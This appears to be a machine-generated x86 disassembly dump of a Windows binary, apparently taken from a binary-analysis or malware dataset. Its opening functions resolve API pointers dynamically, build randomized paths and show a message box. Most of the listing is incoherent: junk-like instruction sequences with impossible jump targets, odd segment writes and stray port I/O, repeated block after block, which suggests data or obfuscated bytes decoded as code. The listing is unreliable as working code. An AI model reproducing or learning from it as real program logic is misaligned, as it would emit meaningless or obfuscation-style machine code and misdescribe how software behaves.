jns r-xdata
cmp [ ebp - 0x5c ] 0x0
je r-xdata
cmp [ ebp - 0x5c ] 0x64
jne r-xdata
mov edx [ ebp - 0x58 ]
mov eax [ edx + 0x8 ]
mov [ ebp - 0xa0 ] eax
push r--data
mov ecx [ ebp - 0x68 ]
push ecx
call [ ebp - 0xa0 ]
mov [ ebp - 0x8c ] eax
cmp [ ebp - 0x8c ] 0x0
je r-xdata
cmp [ ebp - 0x74 ] 0xa
jl r-xdata
jmp r-xdata
push 0x0
mov eax [ ebp - 0x58 ]
add eax 0x14
push eax
mov ecx [ ebp - 0x58 ]
add ecx 0x21c
push ecx
push 0x0
call [ MessageBoxW@IAT ]
mov eax [ ebp - 0x5c ]
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_40c38e
mov esp ebp
pop ebp
retn 0x4
mov edx [ ebp - 0x60 ]
push edx
call [ ebp - 0x8c ]
mov ecx [ ebp - 0x58 ]
add ecx 0x624
push ecx
call [ lstrlenW@IAT ]
test eax eax
jg r-xdata
mov [ ebp - 0x98 ] eax
mov [ ebp - 0x9c ] ecx
mov [ ebp - 0x6c ] edx
push esi
push ebx
sub esp 0x10
call sub_403478
retn 0x50
mov edx [ ebp - 0x70 ]
push edx
mov eax [ ebp - 0x58 ]
add eax 0x21c
push eax
push 0x1
push 0x0
push 0x0
mov ecx [ ebp - 0x60 ]
push ecx
call [ ebp - 0x64 ]
mov [ ebp - 0x5c ] eax
jmp r-xdata
mov edx [ ebp - 0x74 ]
add edx 0x1
mov [ ebp - 0x74 ] edx
cmp [ ebp - 0x5c ] 0x0
jne r-xdata
sub_403b60
push ebp
mov ebp esp
sub esp 0xa8
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov [ ebp - 0x58 ] ecx
mov eax [ ebp - 0x58 ]
add eax 0x21c
mov [ ebp - 0x5c ] eax
mov [ ebp - 0x64 ] 0x0
mov ecx [ ebp - 0x58 ]
mov edx [ ecx ]
mov [ ebp - 0x90 ] edx
mov eax [ ebp - 0x58 ]
mov ecx [ eax + 0x8 ]
mov [ ebp - 0x94 ] ecx
push r--data
mov edx [ ebp - 0x90 ]
push edx
call [ ebp - 0x94 ]
mov [ ebp - 0x98 ] eax
mov [ ebp - 0x78 ] 0x0
push r--data
mov ecx [ ebp - 0x5c ]
push ecx
call sub_404a10
add esp 0x8
sub eax [ ebp - 0x5c ]
sar eax 0x1
mov [ ebp - 0x78 ] eax
jmp r-xdata
call sub_417244
cdq
mov ecx 0x7fff
idiv ecx
imul edx eax 0xfffff83a
add edx 0xa
mov [ ebp - 0x60 ] edx
xor eax eax
mov ecx [ ebp - 0x64 ]
mov edx [ ebp - 0x5c ]
mov [ edx + ecx * 2 ] ax
push 0x0
mov eax [ ebp - 0x58 ]
add eax 0x21c
push eax
call [ ebp - 0x98 ]
mov ecx 0x5c
mov edx [ ebp - 0x64 ]
mov eax [ ebp - 0x5c ]
mov [ eax + edx * 2 ] cx
mov ecx [ ebp - 0x64 ]
mov edx [ ebp - 0x5c ]
lea eax [ edx + ecx * 2 + 0x2 ]
mov [ ebp - 0x5c ] eax
jmp r-xdata
mov edx [ ebp - 0x78 ]
mov [ ebp - 0x64 ] edx
cmp [ ebp - 0x64 ] 0x0
je r-xdata
mov [ ebp - 0x68 ] 0x0
cmp [ ebp - 0x60 ] 0x0
je r-xdata
mov eax [ ebp - 0x60 ]
add eax 0x1
mov [ ebp - 0x60 ] eax
cmp [ ebp - 0x60 ] 0x3e8
je r-xdata
push r--data
mov eax [ ebp - 0x5c ]
push eax
call sub_404a10
add esp 0x8
test eax eax
je r-xdata
mov eax [ ebp - 0x74 ]
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_40c38e
mov esp ebp
pop ebp
retn 0x4
mov [ ebp - 0x6c ] 0x0
jmp r-xdata
jmp r-xdata
jmp r-xdata
mov edx [ ebp - 0x6c ]
cmp edx [ ebp - 0x60 ]
jae r-xdata
cmp [ ebp - 0x60 ] 0x0
je r-xdata
mov ecx [ ebp - 0x68 ]
cmp ecx [ ebp - 0x60 ]
je r-xdata
mov eax [ ebp - 0x68 ]
add eax [ ebp - 0x6c ]
mov [ ebp - 0x68 ] eax
jmp r-xdata
cmp [ ebp - 0x68 ] 0x1
je r-xdata
call sub_417244
cdq
mov ecx 0x7fff
idiv ecx
imul edx eax 0xfffff83a
add edx 0xa
mov [ ebp - 0x68 ] edx
mov ecx [ ebp - 0x6c ]
add ecx 0x1
mov [ ebp - 0x6c ] ecx
mov eax [ ebp - 0x58 ]
mov ecx [ eax ]
mov [ ebp - 0x9c ] ecx
mov edx [ ebp - 0x58 ]
mov eax [ edx + 0x8 ]
mov [ ebp - 0xa0 ] eax
push r--data
mov ecx [ ebp - 0x9c ]
push ecx
call [ ebp - 0xa0 ]
mov [ ebp - 0x88 ] eax
mov [ ebp - 0xa4 ] eax
mov [ ebp - 0xa8 ] ecx
mov [ ebp - 0x70 ] edx
push esi
push ebx
sub esp 0x10
call sub_4043b5
retn 0x50
sub_403d3d
jne r-xdata
jno r-xdata
or edi 0x9a890f
add [ eax ] al
add esp 0x8
jno r-xdata
sub edx 0x11e890f
add [ eax ] al
sbb [ edx + 0x58 ] 0xf8830f
add [ eax ] al
jne 0xf4501df
pop edx
jno r-xdata
mov ecx 0xe981637f
jae r-xdata
sub ecx 0xe1813e75
add [ eax + eax - 0x7af10000 ] 0xea810971
jns r-xdata
call [ 0x40246c81 ]
pop ss
cmp eax 0xec830040
adc [ edx + 0xf ] bl
xchg [ esi ] esp
add [ eax ] eax
add bh bh
and eax 0xce8d0f
add [ eax ] al
jg r-xdata
and ecx 0xd7850f
add [ eax ] al
jns r-xdata
jge 0xffffffffb8afbd3f
pushfd
call sub_403d28
mov eax [ fs : 0xffffffff9ce8c173 ]
push edi
push eax
push edx
call [ 0x29e85351 ]
add [ eax ] al
add [ ecx + 0x515557e9 ] al
push ebp
call sub_403d3d
mov [ fs : ebx - 0x7af0fb3c ] eax
mov esp 0xffffffe
test [ edi ] cl
adc [ eax + 0x5fffffe ] 0x59
sub eax 0xf08c483
xor [ ebx ] 0xb9000001
jae r-xdata
or edi 0x8d0f2c73
ja r-xdata
mov ebp 0xf5d7d58
cmp [ ebp + 0x36 ] 0x3d77870f
jg r-xdata
mov ecx 0xd8810f58
add [ eax ] al
add [ edi ] cl
sbb [ eax + 0x5a ] 0xd817358
pop ecx
jno r-xdata
jno r-xdata
jmp [ 0xffffffff8f0f3973 ]
jae r-xdata
jae r-xdata
jg r-xdata
jne 0x24c14e08
jne r-xdata
call sub_403dc8
ja 0x504c1cf
call 0x52909608
add esp 0x4
jns r-xdata
mov eax 0xc7819173
ja r-xdata
jge 0x71fc7f10
jae r-xdata
xor ecx 0xc18d0f
add [ eax ] al
sub esi 0x73bd047f
push ebp
jg r-xdata
mov [ fs : 0xffffffff840f0e79 ] eax
jns r-xdata
jmp 0xcac6e8
jae r-xdata
xor edx 0x8a810f
add [ eax ] al
jae r-xdata
sub eax 0x4d795a58
jg r-xdata
add edi 0x848f0f
add [ eax ] al
sub ecx 0x811f755a
pop eax
pop edx
jns r-xdata
mov esi 0x55559c9c
jne r-xdata
and eax 0x8b0f327f
pop eax
pop ecx
jge r-xdata
add esp 0x4
jne r-xdata
jg 0xffffffffff96c13f
pop eax
jns r-xdata
sub eax 0xfec5e89c
jno r-xdata
mov [ fs : edx + 0x5a ] ebx
add [ ecx + 0x42850fe2 ] 0xffffffff
sub [ esp + 0x58 ] 0x2
sub esp 0x14
pop ecx
jne r-xdata
je 0xffffffffffa3c709
pop eax
jne r-xdata
xor edi 0x9b810f
add [ eax ] al
jl 0xfffffffff6c1fd98
jns r-xdata
xor edx 0x81257159
r-xdata
jno 0x16402b82
pop edx
jg r-xdata
jpo 0xf70b6a5
push eax
push edi
push ebp
push ecx
and ecx 0xff378f0f
ja r-xdata
and ecx 0xf681ad79
jno r-xdata
pop ecx
or eax 0xf04c483
mov ebp ebp
add esp 0x4
jno r-xdata
je 0xfffffffffed0c1b1
jne r-xdata
jno 0xffffffff834f95ac
jno r-xdata
sub esi 0x89641f79
ja r-xdata
jno r-xdata
mov ebx 0xf04c483
ja r-xdata
call 0xffcb8a7
cmp [ edi + 0x7f ] 0x81

ja r-xdata
jae r-xdata
je 0xffffffff814fdf7e
jne 0xffffffffeac146d8
clc
add [ eax ] al
add [ edi ] cl
test [ ebx - 0x7ef0fb3c ] eax
test [ eax ] al
add [ eax ] al
push ecx
push edx
push ebp
sub esp 0x4
call sub_403fd4
xor ebx 0x15ff4e7f
mov edx 0xff47830f
jne r-xdata
add edi 0xad850f58
add [ eax ] al
add al ch
pop eax
ja r-xdata
xor edx 0x880f5e7f
add [ eax ] al
jns r-xdata
mov edi 0x9c555757
jge r-xdata
jmp [ 0xffffffff8964ba73 ]
jg r-xdata
jg 0xffffffff9c9491b3
ja r-xdata
jns r-xdata
jg r-xdata
add ecx 0xaa890f
add [ eax ] al
jg r-xdata
xor esi 0x25ffca77
jg r-xdata
jo 0xffffffffcbc1bed2
jne r-xdata
sub edi 0x64244481
scasb [ edi ]
inc esi
inc eax
add [ ebx + 0x5a5928ec ] al
add esp 0x4
ja r-xdata
jl 0xffffffffffacd035
jae r-xdata
ja 0xffffffffa3c34fcd
jae r-xdata
xor ebx 0xff728f0f
jae r-xdata
ja 0xffffffff89a47c6e
push esi
push esi
call sub_403eb3
sub ebx 0xfeace855
pushfd
pushfd
push ebp
push ebp
jpo 0x53bd97aa
push edx
call sub_403de9
or edi 0x830f5858
jne r-xdata
pop eax
jge r-xdata
call [ 0x25ff9e79 ]
jge r-xdata
call [ 0xffffffffca81677d ]
jns r-xdata
mov [ fs : edi ] ecx
or esp 0x0
add [ eax ] al
jns r-xdata
mov ebp 0x79055573
sub [ ebx - 0x7ed288a6 ] edi
jg r-xdata
jpo 0xdec5b3
pop eax
pop ecx
jne r-xdata
mov [ fs : edi ] ecx
test [ eax - 0x47000000 ] edi
jne r-xdata
jge r-xdata
add esi 0x83575554
in al dx
add al 0xe8
jae r-xdata
sub ecx 0xfeea830f
add [ eax ] al
add [ edi ] cl
test [ edi + 0x75 ] bh
jg r-xdata
and ebx 0xff5a870f
jg r-xdata
pop edx
pop edx
jae r-xdata
je 0xffffffffa3a4e37e
jno r-xdata
mov esi 0x83555251
in al dx
add al 0xe8
sti
add [ eax ] al
add [ ecx - 0xb1800d ] al
adc eax 0xc181727f
jns r-xdata
test [ edi ] 0x9b81
add [ edi ] cl
mov ebx 0x812d775a
push ebp
pushfd
push esp
push esp
call [ 0xffffffffe9816c73 ]
add [ eax ] al
ja r-xdata
sub ebx 0xec835656
adc al ch
jpe r-xdata
push esi
call sub_4043a2
xor esi 0x72870f59
add [ eax ] eax
add [ esp + edx * 2 + 0xd5e850 ] bh
add [ eax ] al
jg r-xdata
sub edi 0xf681b871
jne r-xdata
add esp 0x8
jne r-xdata
add ebx 0xab810f
add [ eax ] al
xor al [ ecx ]
add [ eax ] al
jae r-xdata
or edx 0xf0c775a
xor [ ebx + 0x3e ] 0x5a59ef81
jne r-xdata
call sub_403e68
xor edi 0x517f5859
jno 0xfffffffff2c19925
push ecx
push ebx
call sub_403db8
sub ecx 0x50515557
and esi 0x73595958
out 0x81 al
0x830f
push ebp
pushfd
call sub_404011
mov edx 0x7504c483
rol [ ecx + 0x108f0fc2 ] 0xff
mov esp 0xe2818371
jne r-xdata
jge r-xdata
mov [ fs : edi - 0x21 ] esi
loope r-xdata
ja r-xdata
and ebx 0xe381c67f
jne r-xdata
pop ecx
pop ecx
jne r-xdata
jo 0x7ff94a2b
pop ecx
jno r-xdata
sub esi 0xf58595a
sub [ edi - 0x1 ] 0xffffffff
inc [ ecx - 0x70f0a53a ]
add [ eax ] 0x0
add [ ebx + 0x71 ] ah
insd
xchg [ edi ] cl
add [ eax ] al
add [ edi ] cl
push edx
push esp
push edx
call sub_404034
sub ecx 0x850f5959
das
mov edi 0xff188d0f
jae r-xdata
and esi 0x89641273
jae r-xdata
mov ebp 0x478f0f5a
pushfd
push esi
call sub_404008
sub ebx 0xa48f0f
add [ eax ] al
sub [ ecx + 0x1 ] 0x0
add [ edi ] cl
adc [ edi + edx * 2 + 0x56 ] 0x55
call sub_404122
add esi 0xa6830f
add [ eax ] al
mov esp 0x58246c83
add al [ ebx + 0xf5914ec ]
test esp ebx
add [ eax ] al
add [ ebx + 0xf04c483 ] bh
add esp 0x4
jne r-xdata
mov eax [ fs : 0xff37958 ]
test [ ebx - 0x1e ] esi
pop eax
jge r-xdata
jge 0xffffffffffa2c2bd
jne r-xdata
or edx 0xf3812e79
jg r-xdata
les eax [ edi + ecx ]
jae r-xdata
js 0x754905e7
jg r-xdata
ja 0xcac3e3
pop ecx
pop ecx
jns r-xdata
add edx 0xc1870f58
sub eax 0x6c7315ff
pop ecx
jno r-xdata
call 0xf450816
and [ ecx - 0x2 ] 0xffffffff
inc [ ecx - 0x1b72f03e ]
pop eax
pop eax
pop edx
jne r-xdata
call 0xf4904ed
lea eax [ ecx + 0x1 ]
add [ eax ] al
jg r-xdata
ja 0xffffffffff9bc28a
jae r-xdata
add edx 0xff108f0f
pop ecx
jns r-xdata
jno 0xffffffff874f7570
jg r-xdata
xor ecx 0xff70810f
jg r-xdata
or eax 0x97e8569c
add [ eax ] al
add [ ecx - 0x5b70f015 ] al
add [ eax ] al
add [ ecx + 0xc775aca ] al
jno 0xffffffffefc17df7
pop edx
jge r-xdata
jo 0xffffffff854f9adc
pop eax
jae r-xdata
and esi 0xc2817577
ja r-xdata
xor ecx 0x30870f59
add [ eax ] eax
add [ edi ] cl
xor [ ebx + 0x7a ] 0xffffffe8
add esp 0x8
or bh [ ebp + 0x478f0f5a ]
jno r-xdata
js 0x7f4505a2
add [ eax ] al
dec ecx
pop ecx
jne r-xdata
jbe 0xffd12e1
jae r-xdata
call sub_404199
jb 0xffffffff81b2be4f
or edx 0x54549c55
jno r-xdata
and ebx 0x870f4975
ja r-xdata
pop edx
mov eax 0xff55870f
ja r-xdata
or ebx 0xff6e8f0f
jae r-xdata
call [ 0xffffffffc181727f ]
pop edx
jg r-xdata
and [ edx + 0xf000000 ] 0xffffff8d
and ecx 0xf04c483
add esp 0x4
jg r-xdata
je 0xffffffff804fb5fd
jge r-xdata
add edx 0xbf810f
add [ eax ] al
jno r-xdata
call [ 0xfbf3f7f ]
lea ebx [ eax ]
sbb [ edi ] ecx
mov [ edi ] cs
jno r-xdata
jge 0xffffffffffa0c620
jne r-xdata
mov [ fs : ebp + 0x19 ] esi
jae r-xdata
xor esi 0xe681cd75
ja r-xdata
xor ebx 0xff3d870f
call sub_403f84
and ecx 0x6c870f59
push edi
push edi
push ebp
pushfd
add eax 0xde810f
add [ eax ] al
jae r-xdata
and edx 0xff53830f
pop edx
pop edx
jne r-xdata
jne r-xdata
mov eax 0xfeef890f
jns r-xdata
sub eax 0x755a5858
mov ah 0x81
0x9c55
jge r-xdata
jpe 0x74cd5224
add esp 0x4
jae r-xdata
jl 0xf3c365
jae r-xdata
jmp 0xffffffffff79c0cb
pop ecx
jno r-xdata
mov ecx 0x15ff2d7f
jae r-xdata
or ecx 0xf18d0f
add [ eax ] al
push esp
push ebp
push edi
sub esp 0x4
call sub_40403f
jae 0xffffffffff43c864
xor ecx 0x890fd079
or esi 0xff24810f
ja r-xdata
and eax 0x4c48358
pop eax
jg r-xdata
jge 0xffffffff894f9a5e
jg r-xdata
add eax 0x5abb2979
jae r-xdata
sub ecx 0x92810f59
add [ eax ] al
add [ ecx - 0x7e39801d ] al
jecxz r-xdata
jns r-xdata
sub ebx 0xe8525452
insb
push eax
pushfd
add ebx 0xdc7f585a
pop ecx
jno r-xdata
and edi 0x800fae73
pop eax
pop ecx
jns r-xdata
ja r-xdata
jno 0xffffffffe89194fb
push 0x81ffffff
out 0x77 al
jne r-xdata
jne r-xdata
add [ esp + 0x64 ] r-xdata
sub esp 0x28
pop ecx
pop edx
sub ebx 0xff2f850f
jns 0x158c5bf
push edi
call sub_404291
jg 0xfffffffff0b39cb8
add edx 0xc381ea77
pop edx
pop eax
jg r-xdata
jno r-xdata
add esp 0x4
pop eax
jge r-xdata
jbe 0x133d13b
pop edx
jg r-xdata
mov [ fs : 0x15ffe47d ] eax
pop ecx
ja r-xdata
xor eax 0xfef4870f
cmp edi 0xffffffff
inc [ ecx + 0x1a830ff3 ]
out dx eax
retn 0x810f
add [ eax ] al
add eax 0x4c4835a
jae r-xdata
jae r-xdata
jo 0x586637b4
ja r-xdata
add edi 0xff74830f
add [ eax ] al
jno 0xf9a9c8e
jae r-xdata
mov [ fs : 0xffffffff8a0f6d71 ] eax
jno r-xdata
jae 0xffffffff8428bada
jae r-xdata
call 0xffffffff854f9cc8
xor al 0xff
pop ecx
ja r-xdata
jge 0xffffffff9c95df69
jo 0xffffffffa2c1517c
push ecx
push edx
call sub_404261
and edx 0x185e856
add [ eax ] al
jl 0xffffffffc1c175be
push edx
call sub_4041fd
and esi 0xe981dd73
pushfd
push edi
pushfd
call sub_404278
jo 0xff9b865
jo 0xffffffff894f9ca2
jae r-xdata
je 0xffffffffff6dc6ac
jge r-xdata
les ecx [ eax ]
jge r-xdata
add ecx 0x870f5859
inc edi
add [ eax ] eax
add [ ecx - 0x7ef0a60a ] al
lodsb [ esi ]
pop edx
jne r-xdata
mov eax [ fs : 0xffffffffc9812675 ]
push esi
call sub_40423b
and edi 0x850fc67f
pop ecx
pop eax
ja r-xdata
push ebp
pushfd
lea ecx [ edi ]
and [ eax - 0x1 ] 0xffffffff
dec [ edi ]
lea edx [ eax - 0x64 ]
insd
jne r-xdata
and edx 0x83519c54
in al dx
or al 0xe8
iretd
jae r-xdata
mov ebp 0x64f37759
mov eax [ 0xffffffffc9812675 ]
xor ecx 0x4ce85251
add [ eax ] al
add [ ecx - 0x7a17a91e ] al
add [ eax ] eax
add [ edi ] cl
sbb [ ecx + 0xf ] 0x81
mov [ 0xf000000 ] al
push esp
push eax
call sub_4042e1
xor edi 0x5f795958
jge r-xdata
add [ eax ] al
add [ edi ] cl
xchg [ edi - 0x30 ] bh
mov esp 0x11b8f0f
add [ eax ] al
sub ecx 0x8199755a
neg [ eax + 0x59 ]
jns r-xdata
xor esi 0xac810f59
jg 0xffffffffff53c7ec
push esp
pushfd
push ecx
sub esp 0xc
call sub_40425e
mov [ fs : 0xffffffff870f5a59 ] eax
lodsd [ esi ]
add [ eax ] al
add [ esi + 0x790cc483 ] bh
iretd
or edi 0x80c481
add [ eax ] al
retn
sub_403db8
jns r-xdata
jns r-xdata
xor esi 0x58b93d7f
jno r-xdata
push ebp
call sub_403d3d
mov [ fs : ebx - 0x7af0fb3c ] eax
mov esp 0xffffffe
test [ edi ] cl
adc [ eax + 0x5fffffe ] 0x59
sub eax 0xf08c483
xor [ ebx ] 0xb9000001
jae r-xdata
jno 0x73989824
jg r-xdata
jne 0x24c14e08
jae r-xdata
sub ecx 0xe1813e75
pop eax
jae r-xdata
add eax 0xf9b7159
test [ edx + 0xf ] ebx
and [ edi + edi * 8 ] 0x15ffffff
or [ 0xffffffffff6d830f ] 0xfe9ffff
mov [ edx - 0x7f000000 ] ecx
iretd
jne r-xdata
and eax 0x8b0f327f
pop eax
pop ecx
jge r-xdata
jns r-xdata
jge 0xffffffffb8afbd3f
pushfd
call sub_403d28
mov eax [ fs : 0xffffffff9ce8c173 ]
push edi
push eax
push edx
call sub_403dc8
ja 0x504c1cf
call [ 0x29e85351 ]
add [ eax ] al
add [ ecx + 0x515557e9 ] al
ja r-xdata
and ebx 0xcf812475
jno r-xdata
pop ecx
or eax 0xf04c483
mov ebp ebp
jno r-xdata
jmp [ 0xffffffff8f0f3973 ]
jae r-xdata
jae r-xdata
pop ecx
jno r-xdata
pop eax
jge r-xdata
call [ 0x25ff9e79 ]
pop edx
jg r-xdata
jpo 0xf70b6a5
jae r-xdata
sub eax 0x4d795a58
jg r-xdata
add edi 0x848f0f
add [ eax ] al
sub ecx 0x811f755a
pop eax
pop edx
jns r-xdata
mov esi 0x55559c9c
jae r-xdata
xor edx 0x8a810f
add [ eax ] al
jae r-xdata
je 0xffffffffa3a4e37e
jg r-xdata
jg 0xffffffff9c9491b3
add esp 0x4
jns r-xdata
mov eax 0xc7819173
sbb [ edx + 0x58 ] 0xf8830f
add [ eax ] al
jne 0xf4501df
push eax
push edi
push ebp
push ecx
and ecx 0xff378f0f
jg r-xdata
mov ecx 0xd8810f58
add [ eax ] al
add [ edi ] cl
sbb [ eax + 0x5a ] 0xd817358
ja r-xdata
and ecx 0xf681ad79
jns r-xdata
jmp 0xcac6e8
call sub_403e68
xor edi 0x517f5859
jno 0xfffffffff2c19925
push ecx
push ebx
call sub_403db8
sub ecx 0x50515557
and esi 0x73595958
out 0x81 al
0x830f
jns r-xdata
push esi
push esi
call sub_403eb3
sub ebx 0xfeace855
pushfd
pushfd
push ebp
push ebp
jpo 0x53bd97aa
push edx
call sub_403de9
or edi 0x830f5858
jne r-xdata
pop eax
jns r-xdata
sub eax 0xfec5e89c
add [ eax + eax - 0x7af10000 ] 0xea810971
jg r-xdata
mov [ fs : 0xffffffff840f0e79 ] eax
jno 0x16402b82
jae r-xdata
je 0xffffffff814fdf7e
jne r-xdata
jno 0xffffffff834f95ac
xor edx 0x81257159
r-xdata
jg r-xdata
and ecx 0xd7850f
add [ eax ] al
clc
add [ eax ] al
add [ edi ] cl
test [ ebx - 0x7ef0fb3c ] eax
test [ eax ] al
add [ eax ] al
jne 0xffffffffeac146d8
sub_403dc8
pop eax
pop edx
pop eax
jae r-xdata
pop edx
pop eax
jae r-xdata
or eax 0xff6d830f
pop eax
pop ecx
jge r-xdata
jne 0xf4501df
pop ecx
or eax 0xf04c483
mov ebp ebp
add [ eax + eax - 0x7af10000 ] 0xea810971
jg r-xdata
jne 0x24c14e08
jno r-xdata
push ebp
call sub_403d3d
mov [ fs : ebx - 0x7af0fb3c ] eax
mov esp 0xffffffe
test [ edi ] cl
adc [ eax + 0x5fffffe ] 0x59
sub eax 0xf08c483
xor [ ebx ] 0xb9000001
jne r-xdata
and eax 0x8b0f327f
jae r-xdata
sub ecx 0xe1813e75
pushfd
call sub_403d28
mov eax [ fs : 0xffffffff9ce8c173 ]
push edi
push eax
push edx
call sub_403dc8
ja 0x504c1cf
call [ 0x29e85351 ]
add [ eax ] al
add [ ecx + 0x515557e9 ] al
jns r-xdata
jge 0xffffffffb8afbd3f
jae r-xdata
pop ecx
jno r-xdata
jno r-xdata
jmp [ 0xffffffff8f0f3973 ]
jae r-xdata
pop eax
pop edx
jns r-xdata
mov esi 0x55559c9c
jae r-xdata
xor edx 0x8a810f
add [ eax ] al
jae r-xdata
sub eax 0x4d795a58
jg r-xdata
add edi 0x848f0f
add [ eax ] al
sub ecx 0x811f755a
ja r-xdata
and ecx 0xf681ad79
jns r-xdata
jmp 0xcac6e8
jg r-xdata
mov ecx 0xd8810f58
add [ eax ] al
add [ edi ] cl
sbb [ eax + 0x5a ] 0xd817358
push eax
push edi
push ebp
push ecx
and ecx 0xff378f0f
jno 0x16402b82
pop edx
jg r-xdata
jpo 0xf70b6a5
jg r-xdata
mov [ fs : 0xffffffff840f0e79 ] eax
add esp 0x4
jns r-xdata
mov eax 0xc7819173
sbb [ edx + 0x58 ] 0xf8830f
add [ eax ] al
jns r-xdata
xor edx 0x81257159
r-xdata
pop eax
jns r-xdata
sub eax 0xfec5e89c
jae r-xdata
je 0xffffffff814fdf7e
jne r-xdata
jno 0xffffffff834f95ac
jg r-xdata
jg 0xffffffff9c9491b3
ja r-xdata
jg r-xdata
and ecx 0xd7850f
add [ eax ] al
clc
add [ eax ] al
add [ edi ] cl
test [ ebx - 0x7ef0fb3c ] eax
test [ eax ] al
add [ eax ] al
jne 0xffffffffeac146d8
push esi
push esi
call sub_403eb3
sub ebx 0xfeace855
pushfd
pushfd
push ebp
push ebp
jpo 0x53bd97aa
push edx
call sub_403de9
or edi 0x830f5858
jne r-xdata
pop eax
jge r-xdata
call [ 0x25ff9e79 ]
jns r-xdata
jae r-xdata
je 0xffffffffa3a4e37e
call sub_403e68
xor edi 0x517f5859
jno 0xfffffffff2c19925
push ecx
push ebx
call sub_403db8
sub ecx 0x50515557
and esi 0x73595958
out 0x81 al
0x830f
sub_403de9
jg r-xdata
pop eax
add esp 0x4
sub ecx 0x811f755a
pop eax
pop edx
jns r-xdata
mov esi 0x55559c9c
ja r-xdata
and ecx 0xf681ad79
pop ecx
jno r-xdata
jno 0x16402b82
jg r-xdata
mov ecx 0xd8810f58
add [ eax ] al
add [ edi ] cl
sbb [ eax + 0x5a ] 0xd817358
jae r-xdata
xor edx 0x8a810f
add [ eax ] al
jns r-xdata
jg r-xdata
mov [ fs : 0xffffffff840f0e79 ] eax
jns r-xdata
jmp 0xcac6e8
jno r-xdata
jmp [ 0xffffffff8f0f3973 ]
jns r-xdata
xor edx 0x81257159
r-xdata
pop edx
jg r-xdata
jpo 0xf70b6a5
jae r-xdata
sub eax 0x4d795a58
jae r-xdata
je 0xffffffff814fdf7e
add esp 0x4
jns r-xdata
mov eax 0xc7819173
sbb [ edx + 0x58 ] 0xf8830f
add [ eax ] al
jne 0xf4501df
push edi
push ebp
push ecx
and ecx 0xff378f0f
jg r-xdata
jg 0xffffffff9c9491b3
ja r-xdata
pop eax
jns r-xdata
sub eax 0xfec5e89c
add [ eax + eax - 0x7af10000 ] 0xea810971
push esi
push esi
call sub_403eb3
sub ebx 0xfeace855
pushfd
pushfd
push ebp
push ebp
jpo 0x53bd97aa
push edx
call sub_403de9
or edi 0x830f5858
jne r-xdata
pop eax
jge r-xdata
call [ 0x25ff9e79 ]
jne r-xdata
jno 0xffffffff834f95ac
push ebp
call sub_403d3d
mov [ fs : ebx - 0x7af0fb3c ] eax
mov esp 0xffffffe
test [ edi ] cl
adc [ eax + 0x5fffffe ] 0x59
sub eax 0xf08c483
xor [ ebx ] 0xb9000001
or eax 0xf04c483
mov ebp ebp
jae r-xdata
je 0xffffffffa3a4e37e
jg r-xdata
push eax
and ecx 0xd7850f
add [ eax ] al
clc
add [ eax ] al
add [ edi ] cl
test [ ebx - 0x7ef0fb3c ] eax
test [ eax ] al
add [ eax ] al
jne 0xffffffffeac146d8
jg r-xdata
jne 0x24c14e08
jae r-xdata
sub ecx 0xe1813e75
call sub_403e68
xor edi 0x517f5859
jno 0xfffffffff2c19925
push ecx
push ebx
call sub_403db8
sub ecx 0x50515557
and esi 0x73595958
out 0x81 al
0x830f
jns r-xdata
jne r-xdata
and eax 0x8b0f327f
pop eax
pop ecx
jge r-xdata
jge 0xffffffffb8afbd3f
pushfd
call sub_403d28
mov eax [ fs : 0xffffffff9ce8c173 ]
push edi
push eax
push edx
call sub_403dc8
ja 0x504c1cf
call [ 0x29e85351 ]
add [ eax ] al
add [ ecx + 0x515557e9 ] al
jno r-xdata
pop ecx
jae r-xdata
jae r-xdata
jg r-xdata
add edi 0x848f0f
add [ eax ] al
sub_403e34
pop eax
pop ecx
pop ecx
jae r-xdata
pop eax
pop eax
jae r-xdata
or edx 0xff50830f
pop ecx
pop eax
jg r-xdata
mov ebx 0x8f0f6975
pop edx
jne r-xdata
jno 0xfffffffff2c19925
push ecx
push ebx
call sub_403db8
sub ecx 0x50515557
and esi 0x73595958
out 0x81 al
0x830f
pushfd
push ebx
push esp
pushfd
add esi 0xf337d58
test [ edi - 0x5b ] bh
pop ecx
jno r-xdata
jno 0x16402b82
jae r-xdata
xor edx 0x8a810f
add [ eax ] al
jns r-xdata
jns r-xdata
jmp 0xcac6e8
jg r-xdata
mov ecx 0xd8810f58
add [ eax ] al
add [ edi ] cl
sbb [ eax + 0x5a ] 0xd817358
jno r-xdata
jmp [ 0xffffffff8f0f3973 ]
pop edx
jg r-xdata
jpo 0xf70b6a5
jg r-xdata
mov [ fs : 0xffffffff840f0e79 ] eax
jae r-xdata
sub eax 0x4d795a58
add esp 0x4
jns r-xdata
mov eax 0xc7819173
sbb [ edx + 0x58 ] 0xf8830f
add [ eax ] al
jne 0xf4501df
jns r-xdata
xor edx 0x81257159
r-xdata
call sub_403e68
xor edi 0x517f5859
push edi
push ebp
push ecx
and ecx 0xff378f0f
pop eax
jns r-xdata
sub eax 0xfec5e89c
add [ eax + eax - 0x7af10000 ] 0xea810971
jae r-xdata
je 0xffffffff814fdf7e
jne r-xdata
jno 0xffffffff834f95ac
push ebp
call sub_403d3d
mov [ fs : ebx - 0x7af0fb3c ] eax
mov esp 0xffffffe
test [ edi ] cl
adc [ eax + 0x5fffffe ] 0x59
sub eax 0xf08c483
xor [ ebx ] 0xb9000001
jg r-xdata
jg 0xffffffff9c9491b3
ja r-xdata
jg r-xdata
push eax
and ecx 0xd7850f
add [ eax ] al
clc
add [ eax ] al
add [ edi ] cl
test [ ebx - 0x7ef0fb3c ] eax
test [ eax ] al
add [ eax ] al
jne 0xffffffffeac146d8
jg r-xdata
jne 0x24c14e08
jae r-xdata
sub ecx 0xe1813e75
pushfd
pushfd
push ebp
push ebp
jpo 0x53bd97aa
push edx
call sub_403de9
or edi 0x830f5858
jne r-xdata
pop eax
jge r-xdata
call [ 0x25ff9e79 ]
jns r-xdata
jne r-xdata
and eax 0x8b0f327f
pop eax
pop ecx
jge r-xdata
jge 0xffffffffb8afbd3f
pushfd
call sub_403d28
mov eax [ fs : 0xffffffff9ce8c173 ]
push edi
push eax
push edx
call sub_403dc8
ja 0x504c1cf
call [ 0x29e85351 ]
add [ eax ] al
add [ ecx + 0x515557e9 ] al
or eax 0xf04c483
mov ebp ebp
jae r-xdata
je 0xffffffffa3a4e37e
jno r-xdata
pop ecx
jae r-xdata
jae r-xdata
jg r-xdata
add edi 0x848f0f
add [ eax ] al
